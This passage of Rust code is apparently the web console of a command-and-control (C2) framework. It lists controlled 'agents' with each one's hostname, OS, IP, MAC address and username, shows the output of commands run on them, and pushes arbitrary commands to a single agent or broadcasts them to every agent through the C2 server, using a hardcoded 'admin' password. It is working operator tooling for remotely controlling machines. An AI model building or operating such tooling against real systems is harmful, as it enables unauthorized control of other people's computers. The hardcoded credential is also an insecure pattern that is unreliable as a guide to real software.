    let agents: Vec<serde_json::Value> = response
        .json()
        .await
        .map_err(|e| format!("Failed to parse response: {}", e))?;

    let mut online_count = 0;
    let agent_vms: Vec<AgentViewModel> = agents
        .into_iter()
        .map(|agent| {
            let last_seen = agent["last_seen"].as_str().unwrap_or("");
            let is_online = is_agent_online(last_seen);
            if is_online {
                online_count += 1;
            }

            AgentViewModel {
                id: agent["id"].as_str().unwrap_or("").to_string(),
                hostname: agent["hostname"].as_str().unwrap_or("Unknown").to_string(),
                os: agent["os"].as_str().unwrap_or("Unknown").to_string(),
                os_version: agent["os_version"].as_str().unwrap_or("").to_string(),
                ip: agent["ip"].as_str().unwrap_or("0.0.0.0").to_string(),
                mac: agent["mac"].as_str().unwrap_or("00:00:00:00:00:00").to_string(),
                username: agent["username"].as_str().unwrap_or("unknown").to_string(),
                last_seen_formatted: format_datetime(last_seen),
                registered_at_formatted: format_datetime(agent["registered_at"].as_str().unwrap_or("")),
                status: if is_online { "Online" } else { "Offline" }.to_string(),
                status_class: if is_online { "status-online" } else { "status-offline" }.to_string(),
            }
        })
        .collect();

    let template = IndexTemplate {
        agents: agent_vms,
        online_count,
    };

    template
        .render()
        .map(Html)
        .map_err(|e| format!("Template error: {}", e))
}

async fn agent_detail(Path(agent_id): Path<String>) -> Result<Html<String>, String> {
    let c2_server_url = get_c2_server_url();
    let client = reqwest::Client::new();

    let agent_response = client
        .get(format!("{}/agents", c2_server_url))
        .send()
        .await
        .map_err(|e| format!("Failed to fetch agents: {}", e))?;

    let agents: Vec<serde_json::Value> = agent_response
        .json()
        .await
        .map_err(|e| format!("Failed to parse agents: {}", e))?;

    let agent_data = agents
        .into_iter()
        .find(|a| a["id"].as_str().unwrap_or("") == agent_id)
        .ok_or("Agent not found")?;

    let last_seen = agent_data["last_seen"].as_str().unwrap_or("");
    let is_online = is_agent_online(last_seen);

    let agent_vm = AgentViewModel {
        id: agent_data["id"].as_str().unwrap_or("").to_string(),
        hostname: agent_data["hostname"].as_str().unwrap_or("Unknown").to_string(),
        os: agent_data["os"].as_str().unwrap_or("Unknown").to_string(),
        os_version: agent_data["os_version"].as_str().unwrap_or("").to_string(),
        ip: agent_data["ip"].as_str().unwrap_or("0.0.0.0").to_string(),
        mac: agent_data["mac"].as_str().unwrap_or("00:00:00:00:00:00").to_string(),
        username: agent_data["username"].as_str().unwrap_or("unknown").to_string(),
        last_seen_formatted: format_datetime(last_seen),
        registered_at_formatted: format_datetime(agent_data["registered_at"].as_str().unwrap_or("")),
        status: if is_online { "Online" } else { "Offline" }.to_string(),
        status_class: if is_online { "status-online" } else { "status-offline" }.to_string(),
    };

    let tasks_response = client
        .get(format!("{}/agent/{}/tasks", c2_server_url, agent_id))
        .send()
        .await
        .map_err(|e| format!("Failed to fetch tasks: {}", e))?;

    let tasks: Vec<TaskInfo> = tasks_response
        .json()
        .await
        .map_err(|e| format!("Failed to parse tasks: {}", e))?;

    let mut task_vms: Vec<TaskViewModel> = tasks
        .into_iter()
        .map(|task| {
            let (status, status_class, output_class) = if let Some(ref result) = task.result {
                if result.exit_code == 0 {
                    ("Done".to_string(), "status-done", "success")
                } else {
                    (format!("Failed ({})", result.exit_code), "status-failed", "error")
                }
            } else {
                ("Pending".to_string(), "status-pending", "")
            };

            let has_result = task.result.is_some();
            let output = task.result.as_ref().map(|r| r.output.clone()).unwrap_or_default();
            let completed_at = task.result.as_ref()
                .map(|r| format_datetime(&r.completed_at))
                .unwrap_or_else(|| "Pending".to_string());

            TaskViewModel {
                task_id: task.task_id.to_string(),
                command: task.command.clone(),
                created_at_formatted: format_datetime(&task.created_at),
                completed_at_formatted: completed_at,
                output,
                exit_code: task.result.as_ref().map(|r| r.exit_code),
                status,
                status_class: status_class.to_string(),
                output_class: output_class.to_string(),
                has_output: has_result && !task.result.as_ref().unwrap().output.is_empty(),
            }
        })
        .collect();

    // Sort tasks by creation time (newest first)
    task_vms.sort_by(|a, b| b.task_id.cmp(&a.task_id));

    // Filter commands based on agent's OS
    let agent_os = &agent_vm.os;
    let filtered_commands: Vec<PredefinedCommand> = get_predefined_commands()
        .into_iter()
        .filter(|cmd| &cmd.os == agent_os)
        .collect();

    let template = AgentTemplate {
        agent: agent_vm,
        tasks: task_vms,
        predefined_commands: filtered_commands,
    };

    template
        .render()
        .map(Html)
        .map_err(|e| format!("Template error: {}", e))
}

async fn create_task(
    Path(agent_id): Path<String>,
    Form(form): Form<TaskForm>,
) -> Result<impl IntoResponse, String> {
    let c2_server_url = get_c2_server_url();
    let agent_uuid = Uuid::parse_str(&agent_id).map_err(|_| "Invalid agent ID")?;

    let request = AddTaskRequest {
        password: "admin".to_string(),
        agent_id: agent_uuid,
        command: form.command,
    };

    let client = reqwest::Client::new();
    let response = client
        .post(format!("{}/add_task", c2_server_url))
        .json(&request)
        .send()
        .await
        .map_err(|e| format!("Failed to create task: {}", e))?;

    if !response.status().is_success() {
        return Err(format!("Server returned error: {}", response.status()));
    }

    Ok(Redirect::to(&format!("/agent/{}", agent_id)))
}

#[derive(Template)]
#[template(path = "broadcast.html")]
struct BroadcastTemplate {
    predefined_commands: Vec<PredefinedCommand>,
}

async fn broadcast_page() -> Result<Html<String>, String> {
    let template = BroadcastTemplate {
        predefined_commands: get_predefined_commands(),
    };

    template
        .render()
        .map(Html)
        .map_err(|e| format!("Template error: {}", e))
}

async fn broadcast_task(Form(form): Form<TaskForm>) -> Result<impl IntoResponse, String> {
    let c2_server_url = get_c2_server_url();
    let client = reqwest::Client::new();

    let agents_response = client
        .get(format!("{}/agents", c2_server_url))
        .send()
        .await
        .map_err(|e| format!("Failed to fetch agents: {}", e))?;

    let agents: Vec<serde_json::Value> = agents_response
        .json()
        .await
        .map_err(|e| format!("Failed to parse agents: {}", e))?;

    let mut _success_count = 0;
    let mut _failed_count = 0;

    for agent in agents {
        if let Some(agent_id_str) = agent["id"].as_str() {
            if let Ok(agent_uuid) = Uuid::parse_str(agent_id_str) {
                let request = AddTaskRequest {
                    password: "admin".to_string(),
                    agent_id: agent_uuid,
                    command: form.command.clone(),
                };

                match client
                    .post(format!("{}/add_task", c2_server_url))
                    .json(&request)
                    .send()
                    .await
                {
                    Ok(response) if response.status().is_success() => {
                        _success_count += 1;
                    }
                    _ => {
                        _failed_count += 1;
                    }
                }
            }
        }
    }

    Ok(Redirect::to("/"))
}

#[tokio::main]
async fn main() {
    let c2_server_url = get_c2_server_url();
    
    let app = Router::new()
        .route("/", get(index))
        .route("/agent/:id", get(agent_detail))
        .route("/agent/:id/task", post(create_task))
        .route("/broadcast", get(broadcast_page))
        .route("/broadcast/task", post(broadcast_task));

    let addr = SocketAddr::from(([127, 0, 0, 1], 3000));
    println!("[*] [ REDACTED ] C2 Web Client starting...");
    println!("[*] Server URL: {}", c2_server_url);
    println!("[*] Web Interface: http://{}", addr);
    println!("[*] Open your browser and navigate to http://localhost:3000");

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
